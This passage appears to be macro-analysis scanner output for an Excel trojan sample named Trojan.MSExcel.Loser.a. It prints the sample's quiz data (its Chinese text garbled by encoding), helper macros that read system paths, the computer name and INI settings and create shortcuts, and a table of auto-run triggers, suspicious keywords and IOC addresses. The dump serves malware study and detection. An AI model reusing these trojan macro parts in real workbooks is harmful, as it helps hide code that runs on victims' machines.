    Q(45) = "ºô»Ú¸ê°Tºô¸ôªº­^¤å¬O¡H"
    Opt1(45) = "Internet"
    Opt2(45) = "Hinet"
    Opt3(45) = "Network"
    Ans(45) = 2
    
    Q(46) = "¥þ²y¸ê°Tºôªº­^¤å¬O¡H"
    Opt1(46) = "FTP"
    Opt2(46) = "WWW"
    Opt3(46) = "BBS"
    Ans(46) = 2
    
    Q(47) = "ÄÝ©ó¸êµ¦·|ªººô¸ô¬O¡H"
    Opt1(47) = "Hinet"
    Opt2(47) = "Seednet"
    Opt3(47) = "TANet"
    Ans(47) = 2
    
    Q(48) = "¥xÆW¾Ç³Nºô¸ôªº­^¤å¬O¡H"
    Opt1(48) = "Seednet"
    Opt2(48) = "Hinet"
    Opt3(48) = "TANet"
    Ans(48) = 3
    
    Q(49) = "¢°¢±¢·ªº¢³¦¸¤è¬O¦h¤Ö¡H"
    Opt1(49) = "268435456"
    Opt2(49) = "288423456"
    Opt3(49) = "208435446"
    Ans(49) = 1
    
    Q(50) = "¦³¸Ö¸t¤§ºÙªº¤¤°ê¾ú¥v¦W¤H¬O½Ö¡H"
    Opt1(50) = "§ù¨j"
    Opt2(50) = "§ùªª"
    Opt3(50) = "§õ¥Õ"
    Ans(50) = 1
    
    Q(51) = "¥H¤U¦óªÌ¤£¬O¥¬³UÀ¸ÅRÆE¨t¦C¤¤ªº¤Hª«¡H"
    Opt1(51) = "¯³°²¥P"
    Opt2(51) = "­»¤EÄÖ"
    Opt3(51) = "¯ÀÁÙ­s"
    Ans(51) = 2
    
    Q(52) = "¥H¤U¦óªÌ¤£¬O¥¬³UÀ¸¤Ñ¦t¨t¦C¤¤ªº¤Hª«¡H"
    Opt1(52) = "Ã¹³¶"
    Opt2(52) = "­»¤EÄÖ"
    Opt3(52) = "°­¤ý´Ã"
    Ans(52) = 3
    
    Q(53) = "¥H¤U¦óªÌ¤£¬OExcel¯à¶}±Ò¤§ÀÉ®×ªº±`¨£°ÆÀÉ¦W¡H"
    Opt1(53) = "XLA"
    Opt2(53) = "XLS"
    Opt3(53) = "DOT"
    Ans(53) = 3
    
    Q(54) = "¥H¤U¦óªÌ¤£¬OExcel¯à¶}±Ò¤§ÀÉ®×ªº±`¨£°ÆÀÉ¦W¡H"
    Opt1(54) = "XLB"
    Opt2(54) = "XLC"
    Opt3(54) = "XLM"
    Ans(54) = 2
    
    Q(55) = "WIndows 95¤ºªºªþÄÝ¹CÀ¸µ{¦¡·s±µÀs¤§ÀÉ®×ªº¦WºÙ¬°¦ó¡H"
    Opt1(55) = "Msheart.exe"
    Opt2(55) = "Freecell.exe"
    Opt3(55) = "Sol.exe"
    Ans(55) = 2
    
    Q(56) = "WIndows 95¤ºªºªþÄÝ¹CÀ¸µ{¦¡±µÀs¤§ÀÉ®×ªº¦WºÙ¬°¦ó¡H"
    Opt1(56) = "Msheart.exe"
    Opt2(56) = "Freecell.exe"
    Opt3(56) = "Sol.exe"
    Ans(56) = 3
    
    Q(57) = "¥H¤U­þ¤@­ÓÀÉ®×¤£¬OWIndows 95µ´¹ï¥²­n¤ºªº¶}¾÷ÀÉ¡H"
    Opt1(57) = "Emm386.exe"
    Opt2(57) = "Msdos.sys"
    Opt3(57) = "Command.com"
    Ans(57) = 1
    
    Q(58) = "¥H¤U­þ¤@­ÓÀÉ®×¤£¬OWIndows 95µ´¹ï¥²­n¤ºªº¶}¾÷ÀÉ¡H"
    Opt1(58) = "Io.sys"
    Opt2(58) = "Msdos.sys"
    Opt3(58) = "Config.sys"
    Ans(58) = 3
    
    Q(59) = "¥H¤U­þ¤@­Ó¤£¬O¹Ï§ÎÀÉ±`¨£ªº°ÆÀÉ¦W¡H"
    Opt1(59) = "WK1"
    Opt2(59) = "JPG"
    Opt3(59) = "PCX"
    Ans(59) = 1
    
    Q(60) = "¥H¤U­þ¤@­Ó¤£¬O¹Ï§ÎÀÉ±`¨£ªº°ÆÀÉ¦W¡H"
    Opt1(60) = "DOC"
    Opt2(60) = "GIF"
    Opt3(60) = "BMP"
    Ans(60) = 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO X.cls 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/X'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function SystemPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetSystemDirectory(b, 255)
        SystemPath = Trim(Left(b, L))
End Function
Public Function GetComputerName()
        Dim b As String * 255
        b = Space$(255)
        L = GetComputerName(b, 255)
        L = InStr(1, b, Chr$(0))
        b = Left(b, L - 1)
        m_ComputerName = Trim(b)
        ComputerName = m_ComputerName
End Function
Public Function WinPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetWindowsDirectory(b, 255)
        WinPath = Trim(Left(b, L))
End Function
Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single
        If Mini >= Maxi Then
                MsgBox Mini & " ¥²¶·¤ñ " & Maxi & " ¤j¡I", vbCritical
                GetRandomNumber = 0
                Exit Function
        End If
        Randomize Timer
        GetRandomNumber = Int((Maxi * Rnd) + Mini)
End Function
Public Sub CreateLink(¦ì¸m As Integer, ±¶®|¦WºÙ As String, ÀÉ®×¸ô®| As String, µ{¦¡°Ñ¼Æ As String)
        Screen.MousePointer = vbHourglass
        Select Case ¦ì¸m
                Case 0 '®à­±
                        Ret = fCreateShellLink("..\..\Desktop", ±¶®|¦WºÙ, ÀÉ®×¸ô®|, µ{¦¡°Ñ¼Æ)
                Case 1 '¶}©l¥\¯àªí
                        Ret = fCreateShellLink("..", ±¶®|¦WºÙ, ÀÉ®×¸ô®|, µ{¦¡°Ñ¼Æ)
                Case 2 'µ{¦¡¶°
                        Ret = fCreateShellLink(".", ±¶®|¦WºÙ, ÀÉ®×¸ô®|, µ{¦¡°Ñ¼Æ)
        End Select
        Screen.MousePointer = 1
End Sub
Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String)
        h = WritePrivateProfileString(Section, KeyName, Setting, File)
End Sub
Public Function GetSettings(AppName As String, Key As String, File As String) As String
        R$ = String$(255, 0)
        X = GetPrivateProfileString(AppName, Key, "", R$, Len(R$), File)
        R$ = Left(R$, InStr(R$, Chr(0)) - 1)
        GetSettings = R$
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  ExcelNo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�S	g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N!k_j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\-Nv��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�f��`�vK�#l'T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���YE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���?��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�[ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��iRL�xe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�L� 
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdStart'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Arrow'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabRight'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Sure'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabRest'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Content'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'O1'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'O2'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'O3'" IN 'Trojan.MSExcel.Loser.a-3d3cd539023b62c85c44f24eeb3eff075867aae1' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |cmdStart_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |140.112.1.6         |IPv4 address                                 |
|IOC       |192.192.35.34       |IPv4 address                                 |
|IOC       |203.64.35.100       |IPv4 address                                 |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |STKIT432.DLL        |Executable file name                         |
|IOC       |Msheart.exe         |Executable file name                         |
|IOC       |Freecell.exe        |Executable file name                         |
|IOC       |Sol.exe             |Executable file name                         |
|IOC       |Emm386.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
